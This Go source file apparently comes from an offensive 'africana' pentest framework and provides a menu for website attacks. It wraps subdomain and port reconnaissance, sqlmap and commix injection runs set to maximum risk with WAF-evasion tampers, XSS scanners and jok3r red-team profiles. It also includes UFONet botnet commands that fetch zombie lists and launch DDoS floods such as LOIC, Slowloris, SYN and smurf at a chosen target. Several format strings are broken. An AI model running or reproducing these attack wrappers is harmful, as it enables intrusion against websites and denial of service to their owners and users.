package webattackers

import (
    "os"
    "fmt"
    "bufio"
    "strings"
    "menus"
    "utils"
    "banners"
    "bcolors"
    "subprocess"
)

var (
    userInput, userPort, userRhost, userXhost, userYhost, userProxy, userModule, userWordlist string
    scanner  = bufio.NewScanner(os.Stdin)
    outPutDir = "/root/.afr3/output"
    toolsDir  = "/root/.afr3/africana-base"
    wordLists = "/root/.afr3/africana-base/wordlists/everything.txt"
)

func WebPentest() {
    for {
        fmt.Printf("%s%safr3%s websites(%s%s%s)%s > %s", bcolors.UNDERL, bcolors.BOLD, bcolors.ENDC, bcolors.RED, "bugbounty_pentest.fn", bcolors.ENDC, bcolors.GREEN, bcolors.ENDC)
        scanner.Scan()
        userInput = strings.TrimSpace(strings.ToLower(scanner.Text()))
        buildParts := strings.Fields(userInput)
        if len(buildParts) == 0 {
            continue
        }

        if executeCommand(userInput) {
            continue
        }

        switch buildParts[0] {
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "set":
            handleSetCommand(buildParts)
        case "unset", "delete":
            handleUnsetCommand(buildParts)
        case "run", "start", "launch", "exploit", "execute":
            executeModule()
        default:
            utils.SystemShell(userInput)
        }
    }
}

func executeCommand(cmd string) bool {
    commandMap := map[string]func(){

        "? info":           menus.HelpInfo,
        "help info":        menus.HelpInfo,

        "v":                banners.Version,
        "version":          banners.Version,

        "s":                utils.Sleep,
        "sleep":            utils.Sleep,

        "o":                utils.ListJunks,
        "junks":            utils.ListJunks,
        "outputs":          utils.ListJunks,
        "clear junks":      utils.ClearJunks,
        "clear outputs":    utils.ClearJunks,

        "logs":             subprocess.LogHistory,
        "history":          subprocess.LogHistory,
        "clear logs":       subprocess.ClearHistory,
        "clear history":    subprocess.ClearHistory,

        "? run":            menus.HelpInfoRun,
        "h run":            menus.HelpInfoRun,
        "info run":         menus.HelpInfoRun,
        "help run":         menus.HelpInfoRun,
        "? use":            menus.HelpInfoRun,
        "h use":            menus.HelpInfoRun,
        "info use":         menus.HelpInfoRun,
        "help use":         menus.HelpInfoRun,
        "? exec":           menus.HelpInfoRun,
        "h exec":           menus.HelpInfoRun,
        "info exec":        menus.HelpInfoRun,
        "help exec":        menus.HelpInfoRun,
        "? start":          menus.HelpInfoRun,
        "h start":          menus.HelpInfoRun,
        "info start":       menus.HelpInfoRun,
        "help start":       menus.HelpInfoRun,
        "? launch":         menus.HelpInfoRun,
        "h launch":         menus.HelpInfoRun,
        "info launch":      menus.HelpInfoRun,
        "help launch":      menus.HelpInfoRun,
        "? exploit":        menus.HelpInfoRun,
        "h exploit":        menus.HelpInfoRun,
        "info exploit":     menus.HelpInfoRun,
        "help exploit":     menus.HelpInfoRun,
        "? execute":        menus.HelpInfoRun,
        "h execute":        menus.HelpInfoRun,
        "info execute":     menus.HelpInfoRun,
        "help execute":     menus.HelpInfoRun,

        "set":              menus.HelpInfoSet,
        "h set":            menus.HelpInfoSet,
        "info set":         menus.HelpInfoSet,
        "help set":         menus.HelpInfoSet,

        "tips":             menus.HelpInfoTips,
        "h tips":           menus.HelpInfoTips,
        "? tips":           menus.HelpInfoTips,
        "info tips":        menus.HelpInfoTips,
        "help tips":        menus.HelpInfoTips,

        "show":             menus.HelpInfoShow,
        "? show":           menus.HelpInfoShow,
        "h show":           menus.HelpInfoShow,
        "info show":        menus.HelpInfoShow,
        "help show":        menus.HelpInfoShow,

        "info list":        menus.HelpInfoList,
        "help list":        menus.HelpInfoList,
        "use list":         menus.HelpInfoList,
        "list":             menus.HelpInfoList,

        "? options":        menus.HelpInfOptions,
        "info options":     menus.HelpInfOptions,
        "help options":     menus.HelpInfOptions,

        "banner":           banners.RandomBanners,
        "g":                utils.BrowseTutarilas,
        "t":                utils.BrowseTutarilas,
        "guide":            utils.BrowseTutarilas,
        "tutarial":         utils.BrowseTutarilas,
        "h":                menus.HelpInfoMenuZero,
        "?":                menus.HelpInfoMenuZero,
        "00":               menus.HelpInfoMenuZero,
        "help":             menus.HelpInfoMenuZero,
        "f":                menus.HelpInfoFeatures,
        "use f":            menus.HelpInfoFeatures,
        "features":         menus.HelpInfoFeatures,
        "use features":     menus.HelpInfoFeatures,

        //Chameleons//
        "info":             menus.HelpInfoMain,

        "m":                menus.MenuEight,
        "menu":             menus.MenuEight,

        "option":           menus.HelpInfOptions,
        "options":          menus.HelpInfOptions,
        "show option":      menus.HelpInfOptions,
        "show options":     menus.HelpInfOptions,

        "modules":          menus.ListMainModules,
        "show all":         menus.ListMainModules,
        "list all":         menus.ListMainModules,
        "list modules":     menus.ListMainModules,
        "show modules":     menus.ListMainModules,
    }
    if action, exists := commandMap[cmd]; exists {
        action()
        return true
    }
    return false
}

func handleSetCommand(parts []string) {
    if len(parts) < 3 {
        menus.HelpInfoSet()
        return
    }
    key, value := parts[1], parts[2]
    setValues := map[string]*string{
       "proxy": &userProxy,
       "rhost": &userRhost,
       "rhosts": &userRhost,
       "target": &userRhost,
       "module": &userModule,
       "wordlist": &userWordlist,
       "wordlists": &userWordlist,
    }
    if ptr, exists := setValues[key]; exists {
        *ptr = value
        fmt.Printf("%s => %s\n", strings.ToUpper(key), value)
    } else {
        menus.HelpInfoSet()
    }
}

func handleUnsetCommand(parts []string) {
    if len(parts) < 2 {
        menus.HelpInfoSet()
        return
    }
    key := parts[1]
    unsetValues := map[string]*string{
       "proxy": &userProxy,
       "rhost": &userRhost,
       "rhosts": &userRhost,
       "target": &userRhost,
       "module": &userModule,
       "wordlist": &userWordlist,
       "wordlists": &userWordlist,
    }
    if ptr, exists := unsetValues[key]; exists {
        *ptr = ""
        fmt.Printf("%s => None\n", strings.ToUpper(key))
    } else {
        menus.HelpInfoSet()
    }
}

func executeModule() {
    if userModule == ""{
        fmt.Printf("\n%s[!] %sMissing required parameter MODULE. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    if userRhost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    WebPenModules(userModule, userRhost)
}

func formatRhost(userRhost string) {
    prefixes := []string{"http://", "https://", "www."}
    userYhost = userRhost
    for _, prefix := range prefixes {
        userYhost = strings.TrimPrefix(userYhost, prefix)
    }
    userYhost = strings.TrimSpace(userYhost)
    if !strings.HasPrefix(userRhost, "http://") && !strings.HasPrefix(userRhost, "https://") {
        userXhost = "http://" + userRhost
    } else {
        userXhost = userRhost
    }
}

func WebPenModules(module string, args ...interface{}) {
    fmt.Printf("\nRHOST => %s\nMODULE => %s\n", userRhost, module)
    if userProxy != "" {
        fmt.Printf("PROXIES => %s\n", userProxy)
        utils.SetProxy(userProxy)
    }

    commands := map[string]func() {
        "enumscan": func() {EnumScan(userRhost)},
        "dnsrecon": func() {DnsRecon(userRhost)},
        "portscan": func() {PortScan(userRhost)},
        "techscan": func() {TechScan(userRhost)},
        "fuzzscan": func() {FuzzScan(userRhost)},
        "leakscan": func() {LeakScan(userRhost)},
        "vulnscan": func() {VulnScan(userRhost)},
       "assetscan": func() {AssetScan(userRhost)},
        "autoscan": func() {AutoScan(userRhost)},
    }

    if action, exists := commands[module]; exists {
        action()
    } else {
        fmt.Printf("\n%s[!] %sInvalid module %s. Use %s'help' %sfor available modules.\n", bcolors.YELLOW, bcolors.ENDC, module, bcolors.DARKGREEN, bcolors.ENDC)
    }
}




















func EnumScan(userRhost string) {
    fmt.Printf("\n%s[*] %sPerforming enumscan scan ...\n", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen("subfinder -all -d %s; amass enum -d %s; findomain -t %s; chaos-client -d %s; shuffledns -d %s; alterx -l %s", userRhost, userRhost, userRhost, userRhost, userRhost, userRhost)
}

func DnsRecon(userRhost string) {
    fmt.Printf("\n%s[*] %sPerforming dnsrecon scan ...\n", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen("dnsx -l %s; asnmap -d %s; cdncheck -l %s", userRhost, userRhost, userRhost)
}

func PortScan(userRhost string) {
    fmt.Printf("\n%s[*] %sPerforming full port scan ...\n", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen("naabu -nmap-cli 'nmap -v -sV -sC' -host %s", userRhost)
}

func TechScan(userRhost string) {
    fmt.Printf("\n%s[*] %sPerforming tech detection scan ...\n", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`httpx -l %s; aquatone -out %s; httprobe -l %s; gowitness -l %s`, userRhost, userRhost, userRhost, userRhost)
}

func FuzzScan(userRhost string) {
    fmt.Printf("\n%s[*] %sPerforming fuzz scan ...\n", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen("dirsearch -l ips_alive --full-url --recursive --exclude-sizes=0B --random-agent -e 7z,archive,ashx,asp,aspx,back,backup,backup-sql,backup.db,backup.sql,bak,bak.zip,bakup,bin,bkp,bson,bz2,core,csv,data,dataset,db,db-backup,db-dump,db.7z,db.bz2,db.gz,db.tar,db.tar.gz,db.zip,dbs.bz2,dll,dmp,dump,dump.7z,dump.db,dump.z,dump.zip,exported,gdb,gdb.dump,gz,gzip,ib,ibd,iso,jar,java,json,jsp,jspf,jspx,ldf,log,lz,lz4,lzh,mongo,neo4j,old,pg.dump,phtm,phtml,psql,rar,rb,rdb,rdb.bz2,rdb.gz,rdb.tar,rdb.tar.gz,rdb.zip,redis,save,sde,sdf,snap,sql,sql.7z,sql.bak,sql.bz2,sql.db,sql.dump,sql.gz,sql.lz,sql.rar,sql.tar.gz,sql.tar.z,sql.xz,sql.z,sql.zip,sqlite,sqlite.bz2,sqlite.gz,sqlite.tar,sqlite.tar.gz,sqlite.zip,sqlite3,sqlitedb,swp,tar,tar.bz2,tar.gz,tar.z,temp,tml,vbk,vhd,war,xhtml,xml,xz,z,zip,conf,config,bak,backup,swp,old,db,sql,asp,aspx~,asp~,py,py~,rb~,php,php~,bkp,cache,cgi,inc,js,json,jsp~,lock,wadl -o output.txt")
}

func LeakScan(userRhost string) {
    fmt.Printf("\n%s[*] %sPerforming leak scan ...\n", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen("gitleaks detect -v; trufflehog filesystem --no-update --json; semgrep -l")
}

func AssetScan(userRhost string) {
    fmt.Printf("\n%s[*] %sPerforming asset scan ...\n", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen("waybackurls %s; gau %s; urlfinder -l %s; gospider -s %s")
}

func VulnScan(userRhost string) {
    fmt.Printf("\n%s[*] %sPerforming vuln scan ...\n", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen("nuclei -l %s; jaeles -l %s; ffuf -u %s; uncover -l %s; cvemap -l %s; dalfox -b -u %s; qsreplace -l %s")
}

func AutoScan(userRhost string) {
    fmt.Printf("\n%s[*] %sPerforming auto scan ...\n", bcolors.GREEN, bcolors.ENDC)
}

func Sublist3r(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming recon scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/sublist3r/; python3 sublist3r.py -v -d %s`, userRhost)
}

func Ashock1(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming recon scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/ashok/; python3 ashok.py --headers %s`, userRhost)
}

func OneForAll(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming recon scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/oneforall/; python3 oneforall.py --alive True --brute True --port medium --dns True --req True --takeover True --show True run --target %s `, userRhost)
}

func SeekOlver(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming recon scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/seekolver/; python3 seekolver.py -v -r -k -cn -p 80 443 -te %s`, userRhost)
}

func ParamSpider(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming urls mine ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/paramspider/; python3 paramspider.py -s -d %s`, userRhost)
}

func SslScan(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming ssl scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`sslscan --show-certificate --show-sigs --tlsall --verbose %s`, userRhost)
}

func Gobuster(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming dir recon ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`gobuster dir vhost --debug --no-error --random-agent -w /root/.afr3/africana-base/wordlists/everything.txt -e -u %s`, userRhost)
}

func Nuclei(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming vuln scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`nuclei -u %s`, userRhost)
}

func Nikto(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming 2nd vuln scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`nikto -ask no -Cgidirs all -Display 3 -host %s`, userRhost)
}

func Bbot(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming 3rd vuln scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`bbot -y -f subdomain-enum email-enum cloud-enum web-basic -m gowitness nuclei --allow-deadly -t %s`, userRhost)
}

func Uniscan(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming 4th vuln scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`uniscan -qweds -u %s`, userRhost)
}

func SqlmapAuto(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming sql scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`sqlmap --tamper=between,luanginx,xforwardedfor --random-agent --threads=10 --level=5 --risk=3 --eta -u %s`, userRhost)
}

func SqlmapMan() {
    fmt.Println("\n%s[*] %sPerforming man sql scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`sqlmap --tamper=between,luanginx,xforwardedfor --random-agent --threads=10 --level=5 --risk=3 --eta -wizard`)
}

func CommixAuto(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming command scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`commix --all --tamper=between,luanginx,xforwardedfor --random-agent --level=3 -u %s`, userRhost)
}

func CommixMan() {
    fmt.Println("\n%s[*] %sPerforming man command scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`commix --all --tamper=between,luanginx,xforwardedfor --random-agent --level=3 --wizard`)
}

func KatanaAuto(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming xss scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`katana -jc -kf all -c 5 -d 3 %s | httpx -silent -follow-redirects -random-agent -status-code -threads 5 | dalfox pipe --only-poc r --ignore-return 302,404,403 --skip-bav`, userRhost)
}

func XsserAuto(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming 2nd xss scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`xsser -c 100 --Cl -u %s`, userRhost)
}

func XsserMan() {
    fmt.Println("\n%s[*] %sPerforming man xss scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`xsser -u --wizard`)
}

func NetTacker1(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming recon scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/nettacker/; python3 nettacker.py -m port_scan -t 100 -i %s `, userRhost)
}

func NetTacker2(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming domain scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/nettacker/; python3 nettacker.py -i %s -m subdomain_scan`, userRhost)
}

func NetTacker3(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming admin finder scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/nettacker/; python3 nettacker.py -i %s -m scan`, userRhost)
}

func NetTacker4(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming info gathering ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/nettacker/; python3 nettacker.py -i %s -m information_gathering -s`, userRhost)
    fmt.Println()
}

func NetTacker5(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming vuln scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/nettacker/; python3 nettacker.py -i %s -m server_version_vuln`, userRhost)
}

func NetTacker6(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming CVE scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/nettacker/; python3 nettacker.py -i %s -m cve`, userRhost)
}

func NetTacker7(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming critical scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/nettacker/; python3 nettacker.py -i %s -m high_severity`, userRhost)
}

func NetTacker8(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming intrusive scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/nettacker/; python3 nettacker.py -i %s --profile all/results.txt`, userRhost)
}

func NetTacker9() {
    fmt.Println("\n%s[*] %sLaunched WebUI key: africana ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/nettacker/; python3 nettacker.py --start-api --api-access-key africana`)
}

func Jok3r1() {
    fmt.Println("\n%s[*] %sInstalling tools in the toolbox ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/jok3r/; bash install-all.sh`)
}

func Jok3r2() {
    fmt.Println("\n%s[*] %sUpdating tools in the toolbox ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/jok3r/; python3 jok3r.py toolbox --update-all --auto`)
}

func Jok3r3() {
    fmt.Println("\n%s[*] %sShowing tools in the toolbox ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/jok3r/; python3 jok3r.py toolbox --show-all`)
}

func Jok3r4() {
    fmt.Println("\n%s[*] %sShowing supported products ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/jok3r/; python3 jok3r.py info --services`)
}

func Jok3r5(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming avery fast-scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/jok3r/; python3 jok3r.py attack -t %s --profile fast-scan --fast`, userRhost)
}

func Jok3r6(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming security checks on " + bcolors.RED + "\nTarget: " + bcolors.YELLOW + "%s \n" + bcolors.ENDC, userRhost)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/jok3r/; python3 jok3r.py attack -t %s --profile red-team --fast`, userRhost)
}

func Jok3r7(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming critical scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/jok3r/; python3 jok3r.py attack -t %s --profile red-team --fast`, userRhost)
}

func Jok3r8() {
    fmt.Println("\n%s[*] %sShowing results & scans ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/jok3r/; xhost +; python3 jok3r.py db creds vulns mission hosts products services report quit; xhost -`)
}

func Jok3r9() {
    fmt.Println("\n%s[*] %sCleaning results & scans ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/jok3r/; python3 jok3r.py db "mission -d default"`)
}

func Osmedeus1() {
    fmt.Println("\n%s[*] %sUpdating Osmedeus & Runing diagnostics to checks ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`osmedeus version --json; osmedeus update; osmedeus update --vuln; osmedeus update --force --clean`)
}

func Osmedeus2(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming simple scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`osmedeus --nv scan -t %s`, userRhost)
}

func Osmedeus3(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming dir & vuln scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`osmedeus --nv scan -f vuln-and-dirb -t %s`, userRhost)
}

func Osmedeus4(userTarge string) {
    fmt.Println("\n%s[*] %sPerforming bulk scan on " + bcolors.ORANGE + "Targets " + bcolors.ENDC + "= " + bcolors.GREEN + bcolors.ITALIC + "%s \n" + bcolors.ENDC, userRhost)
    subprocess.Popen(`osmedeus scan -f vuln-and-dirb -t %s`, userRhost)
}

func Osmedeus5(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming cloud scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`osmedeus health cloud; osmedeus cloud --chunk -c 5 -t %s`, userRhost)
}

func Osmedeus6(userRhost string) {
    fmt.Println("\n%s[*] %sPerforming secret & vuln scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`osmedeus scan --tactic aggressive --nv -f vuln-and-dirb -t %s`, userRhost)
}

func Osmedeus7(userRhost string) {
    fmt.Println("\n%s[*] %sUpdating db before running vuln scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`osmedeus scan --update-vuln -t %s`, userRhost)
}

func Osmedeus8(userPort string) {
    fmt.Println("\n%s[*] %sStarted Osmedeusweb UI server on " + bcolors.ORANGE + "localhost:%s%s", userPort, bcolors.ENDC)
    subprocess.Popen(`osmedeus server --port %s`, userPort)
}

func Osmedeus9() {
    fmt.Println("\n%s[*] %sShowing scanned osmedeus report list ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`osmedeus report list`)
}

func Ufonet1() {
    fmt.Println("\n%s[*] %sDownloading list of bots from C.S ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/ufonet/; python3 ufonet --download-zombies`)
}

func Ufonet2() {
    fmt.Println("\n%s[*] %sTesting If all bots are alive & ready to launch ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/ufonet/; python3 ufonet -t botnet/zombies.txt`)
}

func Ufonet3(userRhost string) {
    fmt.Println("\n%s[*] %sLaunched Palantir 3.14 ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" -a "%s"`, userRhost)
}

func Ufonet4(userRhost string) {
    fmt.Println("\n%s[*] %sLaunched Socking_waves(instant-knockout!) ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/ufonet/; python3 ufonet -r "100" --threads "100" --nuke "10000" -a "%s"`, userRhost)
}

func Ufonet5(userRhost string) {
    fmt.Println("\n%s[*] %sLaunched xcom-1(only DDoS) ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/ufonet/; python3 ufonet -r "100" --threads "100" --spray "1000" --smurf "1000" --tachyon "1000" --monlist "1000" --fraggle "1000" --sniper "1000" -a "%s"`, userRhost)
}

func Ufonet6(userRhost string) {
    fmt.Println("\n%s[*] %sLaunched xcom-2(only DoS) ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" --ufosyn "1000" --xmas "1000" --nuke "1000" --ufoack "1000" --uforst "1000" --droper "1000" --overlap "1000" --pinger "1000" --ufoudp "1000" -a "%s"`, userRhost)
}

func Ufonet7() {
    fmt.Println("\n%s[*] %sLaunched ufonet UI on http://localhost:9999 ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/ufonet/; python3 ufonet --gui`)
}

func Ufonet8() {
    fmt.Println("\n%s[*] %sStarted Grider ufonet --grider ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/ufonet/; python3 ufonet --grider`)
}

func Ufonet9(userRhost string) {
    fmt.Println("\n%s[*] %sLaunched Armageddon! with All! ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/websites/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" --ufosyn "1000" --spray "1000" --smurf "1000" --xmas "1000" --nuke "1000" --tachyon "1000" --monlist "1000" --fraggle "1000" --sniper "1000" --ufoack "1000" --uforst "1000" --droper "1000" --overlap "1000" --pinger "1000" --ufoudp "1000" -a "%s"`, userRhost)
}

